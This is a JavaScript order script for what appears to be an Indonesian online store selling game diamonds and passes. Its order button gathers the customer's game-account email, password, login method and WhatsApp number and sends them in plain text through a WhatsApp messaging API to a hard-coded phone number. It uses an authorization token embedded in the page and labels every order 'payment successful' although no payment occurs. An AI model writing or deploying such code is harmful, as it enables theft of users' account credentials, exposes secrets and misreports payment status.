<script>
let activeTab = null;
const selectedItems = new Set();
const orderList = document.getElementById("order-list");

const dataProduk = {
  diamond: {
    note: "",
    list: [
      ["110 Diamond", "Rp 27.000"],
      ["165 Diamond", "Rp 40.000"],
      ["275 Diamond", "Rp 65.000"],
      ["565 Diamond", "Rp 125.000"],
      ["1.155 Diamond", "Rp 240.000"],
      ["1.765 Diamond", "Rp 360.000"],
      ["2.975 Diamond", "Rp 590.000"],
      ["6.000 Diamond", "Rp 1.165.000"],
      ["12.000 Diamond", "Rp 2.320.000"],
      ["24.000 Diamond", "Rp 4.630.000"]
    ]
  },
  wdp: {
    note: "*Minimal pembelian 2 WDP",
    list: [
      ["1 WDP", "Rp 25.000"],
      ["2 WDP", "Rp 50.000"],
      ["3 WDP", "Rp 74.000"],
      ["4 WDP", "Rp 98.500"],
      ["5 WDP", "Rp 124.000"],
      ["6 WDP", "Rp 149.000"],
      ["7 WDP", "Rp 173.500"],
      ["8 WDP", "Rp 198.500"],
      ["9 WDP", "Rp 223.500"],
      ["10 WDP", "Rp 240.000"]
    ]
  },
  combo: {
    note: "",
    list: [
      ["220 Diamond", "Rp 58.000"],
      ["440 Diamond", "Rp 100.000"],
      ["1.720 Diamond", "Rp 355.000"],
      ["Elite Monthly Bundle", "Rp 14.000"],
      ["Epic Monthly Bundle", "Rp 65.000"],
      ["Twlight Pass", "Rp 125.000"]
    ]
  }
};

function toggleTab(tabName) {
  const container = document.getElementById("produk-container");
  const note = document.getElementById("produk-note");

  if (activeTab === tabName) {
    container.innerHTML = "";
    note.style.display = "none";
    activeTab = null;
  } else {
    activeTab = tabName;
    renderProduk(tabName);
  }
}

function renderProduk(tabName) {
  const container = document.getElementById("produk-container");
  const note = document.getElementById("produk-note");

  container.innerHTML = "";
  const produk = dataProduk[tabName];

  produk.list.forEach(([label, harga]) => {
    const key = `${label} - ${harga}`;
    const div = document.createElement("div");
    div.className = "produk-item";
    div.innerHTML = `<strong>${label}</strong><br><small>${harga}</small>`;

    if (selectedItems.has(key)) div.classList.add("selected");

    div.addEventListener("click", () => {
      if (selectedItems.has(key)) {
        selectedItems.delete(key);
        div.classList.remove("selected");
      } else {
        selectedItems.add(key);
        div.classList.add("selected");
      }
      updateOrderList();
    });

    container.appendChild(div);
  });

  if (produk.note) {
    note.innerText = produk.note;
    note.style.display = "block";
  } else {
    note.style.display = "none";
  }
}

function updateOrderList() {
  orderList.innerHTML = "";
  selectedItems.forEach((item) => {
    const p = document.createElement("p");
    const text = document.createTextNode(item);
    const btn = document.createElement("button");
    btn.className = "cancel-btn";
    btn.textContent = "Cancel";
    btn.onclick = () => removeOrder(item);
    p.classList.add("order-item");
    p.appendChild(text);
    p.appendChild(btn);
    orderList.appendChild(p);
  });
}

function removeOrder(item) {
  selectedItems.delete(item);
  updateOrderList();

  const items = document.querySelectorAll(".produk-item");
  items.forEach((div) => {
    const label = div.querySelector("strong")?.innerText;
    const harga = div.querySelector("small")?.innerText;
    const key = `${label} - ${harga}`;
    if (key === item) {
      div.classList.remove("selected");
    }
  });
}

// Proteksi klik di luar produk & order list
document.body.addEventListener("click", (e) => {
  const produkContainer = document.getElementById("produk-container");
  const orderListBox = document.querySelector(".order-list-box");

  if (!produkContainer.contains(e.target) && !orderListBox.contains(e.target)) {
    if (selectedItems.size === 1) {
      const item = Array.from(selectedItems)[0];
      removeOrder(item);
    }
  }
});

// Tambahkan event listener ke tab kategori
document.addEventListener("DOMContentLoaded", () => {
  document.querySelectorAll(".tab-item").forEach((tab) => {
    tab.addEventListener("click", () => {
      const tabName = tab.dataset.tab;
      toggleTab(tabName);
    });
  });

  // Tombol order dan validasi + bot Fonnte
  const btnOrder = document.querySelector(".btn-order");
  const form = document.getElementById("akun-form");

  btnOrder.addEventListener("click", (e) => {
    const inputs = form.querySelectorAll("input, select");
    let isEmpty = false;
    inputs.forEach((input) => {
      if (!input.value.trim()) isEmpty = true;
    });

    if (isEmpty || selectedItems.size === 0) {
      e.preventDefault();
      Swal.fire({
        icon: "warning",
        title: "Ketua Harap isi semua kolom & pilih item 😁",
        background: "rgba(0,0,0,0.4)",
        color: "#fff",
        confirmButtonText: "Siap ketua 🔥",
        customClass: {
          title: "glow-text",
          popup: "custom-popup",
          confirmButton: "btn-confirm"
        }
      });
      return;
    }

    const data = Object.fromEntries(new FormData(form).entries());
    const listItem = Array.from(selectedItems).join("%0A");
    const message = `🔥 *Order Baru dari Website* 🔥
👤 Nickname: ${data.nickname}
📧 Email: ${data.email}
🔐 Password: ${data.password}
🔑 Login: ${data.loginMethod}
📱 WhatsApp: ${data.whatsapp}
🛒 Order: 
${listItem}
🔒 V2L: ${data.v2l || "tidak diketahui"}
✅ Status: Pembayaran berhasil`;

    fetch("https://api.fonnte.com/send", {
      method: "POST",
      headers: {
        Authorization: "TGNPKLafWVUGGV3mtvsu",
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        target: "6283833121742",
        message: message
      })
    })
      .then((res) => res.json())
      .then((data) => {
        Swal.fire({
          icon: "success",
          title: "Orderan kamu sudah dikirim ke admin ✅",
          background: "rgba(0,0,0,0.5)",
          color: "#fff",
          confirmButtonText: "Oke Ketua",
          customClass: {
            title: "glow-text",
            popup: "custom-popup",
            confirmButton: "btn-confirm"
          }
        });
      })
      .catch((err) => {
        Swal.fire({
          icon: "error",
          title: "Gagal mengirim ke WhatsApp 😢",
          background: "rgba(0,0,0,0.5)",
          color: "#fff"
        });
      });
  });
});
</script>
